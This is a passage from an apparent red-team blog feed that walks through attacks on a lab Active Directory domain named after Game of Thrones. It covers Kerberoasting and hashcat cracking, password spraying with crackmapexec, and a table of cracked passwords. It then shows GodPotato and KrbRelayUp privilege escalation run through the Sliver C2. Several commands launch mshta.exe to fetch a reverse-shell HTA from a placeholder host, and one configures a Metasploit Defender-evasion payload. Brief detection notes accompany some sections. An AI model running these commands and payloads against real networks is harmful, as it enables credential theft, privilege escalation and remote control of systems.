SamAccountName         : sql_svc</span><br><span class="line">[*] DistinguishedName      : CN=sql_svc,CN=Users,DC=north,DC=sevenkingdoms,DC=local</span><br><span class="line">[*] ServicePrincipalName   : MSSQLSvc/castelblack.north.sevenkingdoms.local</span><br><span class="line">[*] PwdLastSet             : 3/7/2023 9:04:11 PM</span><br><span class="line">[*] Supported ETypes       : RC4_HMAC_DEFAULT</span><br><span class="line">[*] Hash                   : $krb5tgs$23$*sql_svc$north.sevenkingdoms.local$MSSQLSvc/castelblack.north.sevenkingdoms.local@north.sevenkingdoms.local*$B92A064DA6873DCA0D2AA674BBA524AD$A55AE732B29B107D96397FB4465895D4831532506B885EE3FE7F5C35D9641412AD1FCB6B33FDBB84675EF393F86F1D65A58DF8FE62316A47C56D65D9A1144637F1A2906C497E6ECE8059CA4FB2EA64A2975BE4D896A9CBE1159914095F0AF0F261ED38F5C4DF4D9AF2D02A3905A8239461E4D2C3DADFE81950EBB04B928435A950FD5B73E995AA6451422374C6C57DBA7699705536C3B9D32EA05360E3706054B995A6AEBA7E783AAC5C281A3E11C533C9929F9163957CC2F5E3576142D254E42566916B7216609FA0F75289070E5C33560CA3FA17E21023F37F5F2C1B0C536D9479FCABC15EC29BB1533C00E64B92E632EF262650C33AF4317C93BB9E047BCF2C9BE66A97CAB4176DF1F180002D4A8B16943C3963EFC6DF8E1E0008345EA2B8D48362E168944B1DAEA266FD9C3620A11E6916663711FEEEC34362850E18F003C82454C6AE6CDFD9EFA857CE2FB08C248B0E57F5F62DB6DBE78637E781501D910C56B6F0EB5C2E16E96CA945B5B2B879F28876183FC3EDE945E63202BF2BBF4D65CE208A50856F104DD2EF10A5B3EF1A15DBAE755BCC0B864D6ACED7BEB5702D30CEA38143D64ECECA14C22805C2A26AAAE290406AC9E85870DE788C388C6D8CEE1268D793462044A921FD26ED1959195B39E4695E547110985BFBD7ECBDC4A28CDE9D168869C262C37E7B4031459E4E37894E84C3C42E8436D6D07D915A1ECD075B73A9F8A309F48149828F0C2317944ED298EC46E2CEB1C976311F7BBF50AA2A24AF24180A580DEDA88A78A0C926675A64AA1CA3990CAC21B1C7B5D870B7BF30102F22E3A6985EA92CC652A77240941E3607E58396DCD0FF802154B735809E3DD30000659C5E5B8A9FD3F43D7CFB2783579310AEEE95A96671F4AE5F52DFDF05F7E92638039F9BF7A03EE4777C005BD6E5F65E1E20E79D704F39688018FA7271B6399E79ED22FD7613D11465338F3A1BA6BAB2FEBE6FF40939CB4DF1A638B3A77DED52EB5A7A0DC934875CC6AE93B19193AADD3D0C824CA8F99AB24EA0B6659FB126724ED817A433994430D428BB874690A90022A30DA7EE5C0A209F2EF9A8E333BE7BB76B1D9199FD293AE9ADF28BB1C95BF5088AE0F1AFC784B3F486B354B2F13AD49B138BE4986612098B3A8BF0DDAAC8D5B829DA1F2392C1817F42879530497C620F63D321630C15E794A8261F49B129B1573904071F97A3FBE46F9303EA5CAB9781039B18AC6F4B316AEC0B6E728EF021C5A89F71EB91BA514456CB5ACF5E7635FB5BE0B725DBA6F2188948A61BF9CC8FA92FA391E2A7D13B481E0521FE80B74341243C3CCAE46F2278A5D354DA1EA3D78024A472D9B3E3AA3E77461BC20E4DB4EC46EB61B6D4078EE6D6529C2E28B478E7F92D6C88D94D9C5C29963DC1754B2E94FC928269209B935D7512E645BB28332AF7974DDF6AC049C6F8EF2F9663C00A1692059A752B538F05D9C14D7532407FBC67985FD03328D94E61C962908234AA9A6838254BD0417126765B412D996D834177884341452A320F531753A83A91F69EFC142F40A62CD14100CA1E8FFB3198500656E2993715A5E51B0BAA4716F2B3EF3C5151</span><br></pre></td></tr></table></figure><p>We found 2 SPN, we already found <code>sql_svc</code> hash from lsass dump.</p><p>let’s crack <code>jon.snow</code> using hashcat.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -m 13100 --force -a 0 /tmp/krb.txt Documents/rockyou.txt</span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*jon.snow<span class="variable">$north</span>.sevenkingdoms.local<span class="variable">$CIFS</span>/winterfell.north.sevenkingdoms.local@north.sevenkingdoms.local*$8ef414d681e524f03c47f7435af5989e<span class="variable">$200c6cdfd190f0244b49032d3ece955eabd7fbeff02be962579675b52ea16964e09b81ff9b1438bc528c54c3b64d26465d0f9b396496fc2f5ba43feb2f1a86a2bbb5eacc7727a443fd93815b4ef8e52336d3f2c04680f83798c9ab066930253d939da7cb84a3208ae985e23003f224432c3d57eceb3434b049b62f83ecb5c1e4ccd73a483b76f5a8bb56486dc21d0818987f9fa769641c943bca2436a5de1e840dbe756f736defae6f5957a4133c853954b6d851b0794cb709697ba1865252b298a00c17bec7538f5e5ca1ba19cf12b23144b190d250bc0340acb5eb71671dc834025c28615ee67ed46dddd3198c22563e1423f4b4d42ef0a9090f90b249ff474808027277aa27bd7975a46ba953df15710b4474310a83299f75aac4ad308851c1dccba55d60f6e640a62f2b7883642de0f9e0a260c443a505b4eb105016729a281e112917cd61945eb77d0aed0adca9db7676d11a718490e0f85aa8efb4a2a2c89a4674f574fb0b74d4d7cf2ab0977fec6f9822883ad1f57b35aaedc4f06a24c9563f08d0078b36bf86e19c62b3ea5c310491d01fe340e57a0e21af4d1ccb29cb1fea209ee6250603162e55df4744c3527ed256cea9b2302768ca6045f153bc10ad22c25df3776cb3f19ed471799f69f4ea799c200838d08313900d0cbd6b1695b1222a6815d7005d5de2b2293169509b0fd2343f9f04722ea8ce0c96f982ac5925f89604ab41307ce6077d78b8212de6676a83c706365b33feb1b000eda6780bd31453cd71c35002f6d978c3b2ca71fbd34d06b20bc223f56f966467086ea2794d86c4333a79594797e88fac36c4a7519a18a522b011e72110dd07bc5ab7ff52d29bfbab36d2c57d763eae9be83e978e4b1caf1f3bd6cf19e3899219e3bb96d6736f3479386734cf822aab53ceb343c60839633bf72d5af71f409ef04316364d8ca4a80745541be4b933b1fe0258c8857b5b62d0c4e589c09d57c02338514e56f9c2cc3e1a7f14b4fbd880ffbd2162ee38f3f8a67fb3b7fd38eede132c13c433634b7df4a9ebae23c9a48b62fea9bff2654740078b5a6bd5a27b90ac5c7cd5549c9df0c02c3cc6eb91416dc8c2d5b119ccc7e2e240b3d2c0f97ef0ca454eea8b762fe8d90d5286c26174bde87793bef12dff317a77804128521173209ee1093ea665bf16c9364036ab3ec0017902e816943918f086ec4dcc29e394485a78fb1ffb24521a640032086b9356393e5696a71a63a393ddf00725615e990bdcd59962a7c66c81192f566805544020735000052effeb9726a1f30797f2dc28f404e1f696fd9fe3c37c52949ed767c4db732b78a05534e748df33e8c3bc51a47a2c28206a90dac77d5cc7d2410898f9c4c9b7548640d6f43d33c46fdff6b973a580904c055b53b8635767e161ab1705d635b8a406874dfe17bcce0489e5dfa6822fd2d8c76dc910717ea84b53ed07940df5ff38e6f6f3c3ba7ad490e969aeeb0f103c41b12d4789fe557673f12cd4e86a8e5bbb086b5070ebfb1bf62adbe237ec6c159b24ebade43354e59c040e61dbb47d714f383b30317807c9186c02450c4b61f773c88c10b43e992f</span>:iknownothing</span><br></pre></td></tr></table></figure><p>User <code>jon.snow</code> is done with password <code>iknownothing</code>.</p><h2 id="Enumerating-passwords-in-AD-users-comments"><a href="#Enumerating-passwords-in-AD-users-comments" class="headerlink" title="Enumerating passwords in AD users comments."></a>Enumerating passwords in AD users comments.</h2><h3 id="SOCKS-Proxy"><a href="#SOCKS-Proxy" class="headerlink" title="SOCKS Proxy"></a>SOCKS Proxy</h3><p>Let’s start socks proxy on our team server to run our tools from the operator machine.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sliver (REAL_ROBIN) &gt; socks5 start</span><br><span class="line"></span><br><span class="line">[*] Started SOCKS5 127.0.0.1 1081  </span><br><span class="line">⚠️  In-band SOCKS proxies can be a little unstable depending on protocol</span><br><span class="line"></span><br><span class="line">sliver (REAL_ROBIN) &gt; socks5 </span><br><span class="line"></span><br><span class="line"> ID   Session ID                             Bind Address     Username   Passwords </span><br><span class="line">==== ====================================== ================ ========== ===========</span><br><span class="line">  1   3b25e2f9-d03a-4198-a4f6-6926a5ef488e   127.0.0.1:1081 </span><br></pre></td></tr></table></figure><p>Crackmapexec module <code>user-desc</code> can be used to search for passwords in users descriptions.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains -q  crackmapexec ldap 192.168.24.11 -u <span class="string">&#x27;CASTELBLACK$&#x27;</span> -H 95508055cf7a74e202139b07ec29690d -M user-desc</span><br><span class="line">/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: <span class="string">&quot;is not&quot;</span> with a literal. Did you mean <span class="string">&quot;!=&quot;</span>?</span><br><span class="line">  <span class="keyword">if</span> result[<span class="string">&#x27;type&#x27;</span>] is not <span class="string">&#x27;searchResEntry&#x27;</span>:</span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       [+] north.sevenkingdoms.local\CASTELBLACK$:95508055cf7a74e202139b07ec29690d </span><br><span class="line">USER-DES...                                         User: krbtgt - Description: Key Distribution Center Service Account</span><br><span class="line">USER-DES...                                         User: samwell.tarly - Description: Samwell Tarly (Password : Heartsbane)</span><br><span class="line">USER-DES...                                         Saved 15 user descriptions to /home/kali/.cme/logs/UserDesc-192.168.24.11-20230305_185424.<span class="built_in">log</span></span><br></pre></td></tr></table></figure><p>We found user <code>samwell.tarly</code> password <code>Heartsbane</code> in the description.</p><h2 id="Username-same-as-password"><a href="#Username-same-as-password" class="headerlink" title="Username same as password"></a>Username same as password</h2><p>Starting a password brutforce to check if any user has its own password as the username.</p><h3 id="Getting-user-list"><a href="#Getting-user-list" class="headerlink" title="Getting user list."></a>Getting user list.</h3><p>We can get target user list as in below.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains -q  crackmapexec ldap 192.168.24.11 -u <span class="string">&#x27;CASTELBLACK$&#x27;</span> -H 95508055cf7a74e202139b07ec29690d --<span class="built_in">users</span>                           </span><br><span class="line">/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: <span class="string">&quot;is not&quot;</span> with a literal. Did you mean <span class="string">&quot;!=&quot;</span>?</span><br><span class="line">  <span class="keyword">if</span> result[<span class="string">&#x27;type&#x27;</span>] is not <span class="string">&#x27;searchResEntry&#x27;</span>:</span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       [+] north.sevenkingdoms.local\CASTELBLACK$:95508055cf7a74e202139b07ec29690d </span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       [*] Total of records returned 17</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       Administrator                  Built-<span class="keyword">in</span> account <span class="keyword">for</span> administering the computer/domain</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       Guest                          Built-<span class="keyword">in</span> account <span class="keyword">for</span> guest access to the computer/domain</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       ansible                        </span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       krbtgt                         Key Distribution Center Service Account</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       arya.stark                     Arya Stark</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       eddard.stark                   Eddard Stark</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       catelyn.stark                  Catelyn Stark</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       robb.stark                     Robb Stark</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       sansa.stark                    Sansa Stark</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       brandon.stark                  Brandon Stark</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       rickon.stark                   Rickon Stark</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       hodor                          Brainless Giant</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       jon.snow                       Jon Snow</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       samwell.tarly                  Samwell Tarly (Password : Heartsbane)</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       jeor.mormont                   Jeor Mormont</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       sql_svc                        sql service</span><br></pre></td></tr></table></figure><p>Execluding compromised accounts and running the bruteforce against the others.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains -q  crackmapexec smb 192.168.24.11 -u /tmp/users.txt -p /tmp/users.txt --no-bruteforce --continue-on-success</span><br><span class="line">/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: <span class="string">&quot;is not&quot;</span> with a literal. Did you mean <span class="string">&quot;!=&quot;</span>?</span><br><span class="line">  <span class="keyword">if</span> result[<span class="string">&#x27;type&#x27;</span>] is not <span class="string">&#x27;searchResEntry&#x27;</span>:</span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [-] north.sevenkingdoms.local\arya.stark:arya.stark STATUS_LOGON_FAILURE </span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [-] north.sevenkingdoms.local\eddard.stark:eddard.stark STATUS_LOGON_FAILURE </span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [-] north.sevenkingdoms.local\catelyn.stark:catelyn.stark STATUS_LOGON_FAILURE </span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [-] north.sevenkingdoms.local\robb.stark:robb.stark STATUS_LOGON_FAILURE </span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [-] north.sevenkingdoms.local\sansa.stark:sansa.stark STATUS_LOGON_FAILURE </span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [-] north.sevenkingdoms.local\rickon.stark:rickon.stark STATUS_LOGON_FAILURE </span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor </span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [-] north.sevenkingdoms.local\jeor.mormont:jeor.mormont STATUS_LOGON_FAILURE </span><br></pre></td></tr></table></figure><p>We were able to retrieve user <code>hodor</code> password.</p><h2 id="Compromised-accounts"><a href="#Compromised-accounts" class="headerlink" title="Compromised accounts"></a>Compromised accounts</h2><table><thead><tr><th>User</th><th>Password</th></tr></thead><tbody><tr><td>sql_svc</td><td>84a5092f53390ea48d660be52b93b804</td></tr><tr><td>samwell.tarly</td><td>Heartsbane</td></tr><tr><td>brandon.stark</td><td>iseedeadpeople</td></tr><tr><td>jon.snow</td><td>iknownothing</td></tr><tr><td>hodor</td><td>hodor</td></tr></tbody></table><h2 id="Observasions"><a href="#Observasions" class="headerlink" title="Observasions"></a>Observasions</h2><h3 id="ASReproasting-1"><a href="#ASReproasting-1" class="headerlink" title="ASReproasting"></a>ASReproasting</h3><p>We are mainly looking for an account with pre-authentication is not required, event id 4768 and kerberos encrytion is RC4.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/04/03/Credentials-Access/asreproasting.png" class=""><h3 id="Kerberoasting-1"><a href="#Kerberoasting-1" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p>Kerberoasting is identified by kerberos ticket request and RC4 encryption, and event id 4769.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/04/03/Credentials-Access/kerberoasting.png" class=""><h3 id="Brute-force"><a href="#Brute-force" class="headerlink" title="Brute-force"></a>Brute-force</h3><p>Brute-force is identified by successive logon, logoff and credentials validation event types.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/04/03/Credentials-Access/bruteforce.png" class="">]]></content>
      
      
      <categories>
          
          <category> red team </category>
          
          <category> credentials access </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sliver </tag>
            
            <tag> T1003.001 </tag>
            
            <tag> lsass </tag>
            
            <tag> sharpkatz </tag>
            
            <tag> bruteforce </tag>
            
            <tag> crackmapexec </tag>
            
            <tag> Rubeus </tag>
            
            <tag> Kerberoasting </tag>
            
            <tag> AS-Reproasting </tag>
            
            <tag> T1558.004 </tag>
            
            <tag> T1110 </tag>
            
            <tag> T1552 </tag>
            
            <tag> T1558.003 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2.c Privilege Escalation - Potatoes</title>
      <link href="https://mmnoureldin.github.io/Red-Team/2023/03/09/Privilege-Escalation-Potatoes/"/>
      <url>https://mmnoureldin.github.io/Red-Team/2023/03/09/Privilege-Escalation-Potatoes/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>There are a lot of different potatoes exploits used to escalate privileges from <code>Windows Service Accounts</code> to <code>NT AUTHORITY/SYSTEM</code>, <a href="https://github.com/BeichenDream/GodPotato" title="" target="">godpotato</a> is a recent tool that combines many of these techniques together, even better, it is also works on windows 11.</p><p>This post is a continuation for an alternate way to escalate our privilege after gaining access as in <a href="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/" title="1. Gaining Initial Foothold">1. Gaining Initial Foothold</a>.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/03/09/Privilege-Escalation-Potatoes/mindmap_godpotato.png" class=""><span id="more"></span><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>The exploitation is very simple, first we need to download the binary from the <a href="https://github.com/BeichenDream/GodPotato" title="" target="">source on github</a>.<br>Then we can use our C2 to execute it.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sliver (PARALLEL_SEASIDE) &gt; execute-assembly -M -E /opt/godpotato/GodPotato-NET4.exe -cmd \&quot;cmd.exe /C &#x27;mshta.exe https://fake-host.com/shell.hta&#x27;\&quot;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>Among other logs the most notable ones are the creation of a named pipe and the access by the <code>system</code> user to it.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/03/09/Privilege-Escalation-Potatoes/image-20230430012402870.png" class="">]]></content>
      
      
      <categories>
          
          <category> red team </category>
          
          <category> privilege escalation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> T1055 </tag>
            
            <tag> Print Spoofer </tag>
            
            <tag> Spool sample </tag>
            
            <tag> T1134 </tag>
            
            <tag> T1003.001 </tag>
            
            <tag> named pipe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2.b Privilege Escalation - KrbRelayUp</title>
      <link href="https://mmnoureldin.github.io/Red-Team/2023/03/08/Privilege-Escalation-KRBRelayup/"/>
      <url>https://mmnoureldin.github.io/Red-Team/2023/03/08/Privilege-Escalation-KRBRelayup/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This post is built on what we have acheieved on our last post <a href="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/" title="1. Gaining Initial Foothold">1. Gaining Initial Foothold</a>.</p><p>In this post we will create a machine account then relay kerberos authentication over LDAP to a domain controller where signing is disabled to add the newly created machine account to the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute of our local machine, then perform the resource based constrined delegation attack where we will be able to gain a system level access.</p><p>Fortunately, we will not perform this manually, the tool of trade to automate this exploitation is <a href="https://github.com/Dec0ne/KrbRelayUp" title="" target="">KrbRelayUp</a>.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/03/08/Privilege-Escalation-KRBRelayup/mindmap_krbrelay.png" class=""><span id="more"></span><h2 id="Preqreuists"><a href="#Preqreuists" class="headerlink" title="Preqreuists"></a>Preqreuists</h2><ul><li><p>LDAP signing is off.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains -q  crackmapexec  ldap 192.168.24.11 -u hodor -p hodor -d north.sevenkingdoms.local -M ldap-signing</span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor </span><br><span class="line">LDAP-SIG... 192.168.24.11   389    WINTERFELL       LDAP signing is NOT enforced on 192.168.24.11</span><br></pre></td></tr></table></figure></li><li><p>Ability to add machine to the domain.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains -q  crackmapexec ldap 192.168.24.11 -u hodor -p hodor -d north.sevenkingdoms.local -M MAQ</span><br><span class="line"></span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor </span><br><span class="line">MAQ         192.168.24.11   389    WINTERFELL       [*] Getting the MachineAccountQuota</span><br><span class="line">MAQ         192.168.24.11   389    WINTERFELL       MachineAccountQuota: 10</span><br></pre></td></tr></table></figure></li></ul><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><ol><li><p>Add Computer account, RBCD rights and relay kerberos to LDAP.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sliver (PURPLE_SOOT) &gt; krbrelayup relay -Domain north.sevenkingdoms.local -CreateNewComputerAccount -ComputerName fakeone$ -ComputerPassword P@ssw0rd</span><br><span class="line"></span><br><span class="line">[*] krbrelayup output:</span><br><span class="line">KrbRelayUp - Relaying you to SYSTEM</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Computer account &quot;fakeone$&quot; added with password &quot;P@ssw0rd&quot;</span><br><span class="line">[+] Rewriting function table</span><br><span class="line">[+] Rewriting PEB</span><br><span class="line">[+] Init COM server</span><br><span class="line">[+] Register COM server</span><br><span class="line">[+] Forcing SYSTEM authentication</span><br><span class="line">[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...</span><br><span class="line">[+] LDAP session established</span><br><span class="line">[+] RBCD rights added successfully</span><br><span class="line">[+] Run the spawn method for SYSTEM shell:</span><br><span class="line">    ./KrbRelayUp spawn -d north.sevenkingdoms.local -cn fakeone$ -cp P@ssw0rd</span><br></pre></td></tr></table></figure></li><li><p>Generate an <code>hta</code> reverse shell using Metasploit.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf6 evasion(windows/windows_defender_js_hta) &gt; run </span><br><span class="line"></span><br><span class="line">[+] shell.hta stored at /home/kali/.msf4/local/shell.hta</span><br><span class="line">msf6 evasion(windows/windows_defender_js_hta) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (evasion/windows/windows_defender_js_hta):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   FILENAME  shell.hta        yes       Filename for the evasive file (default: random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/custom/reverse_winhttps):</span><br><span class="line"></span><br><span class="line">   Name            Current Setting  Required  Description</span><br><span class="line">   ----            ---------------  --------  -----------</span><br><span class="line">   EXITFUNC        process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST           192.168.24.138   yes       The local listener hostname</span><br><span class="line">   LPORT           443              yes       The local listener port</span><br><span class="line">   LURI            /hello.woff      no        The HTTP Path</span><br><span class="line">   SHELLCODE_FILE                   no        Shellcode bin to launch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Evasion target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Microsoft Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d command.</span><br></pre></td></tr></table></figure></li><li><p>Initiate RBCD &amp; obtain system shell.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">sliver (PURPLE_SOOT) &gt; krbrelayup spawn -d north.sevenkingdoms.local -cn fakeone$ -cp P@ssw0rd -sc \&quot;cmd.exe /C &#x27;mshta.exe https://fake-host.com/shell.hta&#x27;\&quot; -s mmm</span><br><span class="line"></span><br><span class="line">[*] krbrelayup output:</span><br><span class="line">KrbRelayUp - Relaying you to SYSTEM</span><br><span class="line"></span><br><span class="line">[+] TGT request successful!</span><br><span class="line">[+] Ticket successfully imported!</span><br><span class="line">[+] Building S4U2self </span><br><span class="line">[*] Using domain controller: winterfell.north.sevenkingdoms.local (192.168.24.11)</span><br><span class="line">[+] Sending S4U2self request to 192.168.24.11:88</span><br><span class="line">[+] S4U2self success!</span><br><span class="line">[+] Got a TGS for &#x27;Administrator&#x27; to &#x27;fakeone$@NORTH.SEVENKINGDOMS.LOCAL&#x27;</span><br><span class="line">[+] Impersonating user &#x27;Administrator&#x27; to target SPN &#x27;HOST/CASTELBLACK&#x27;</span><br><span class="line">[+] Building S4U2proxy request for service: &#x27;HOST/CASTELBLACK&#x27;</span><br><span class="line">[*] Using domain controller: winterfell.north.sevenkingdoms.local (192.168.24.11)</span><br><span class="line">[+] Sending S4U2proxy request to domain controller 192.168.24.11:88</span><br><span class="line">[+] S4U2proxy success!</span><br><span class="line">[+] Ticket successfully imported!</span><br><span class="line">[+] Using ticket to connect to Service Manger</span><br><span class="line">[+] AcquireCredentialsHandleHook called for package N</span><br><span class="line">[+] Changing to Kerberos package</span><br><span class="line">[+] InitializeSecurityContextHook called for target H</span><br><span class="line">[+] InitializeSecurityContext status = 0x00090312</span><br><span class="line">[+] InitializeSecurityContextHook called for target H</span><br><span class="line">[+] InitializeSecurityContext status = 0x00000000</span><br><span class="line">[+] mmm Service created</span><br><span class="line">[+] mmm Service 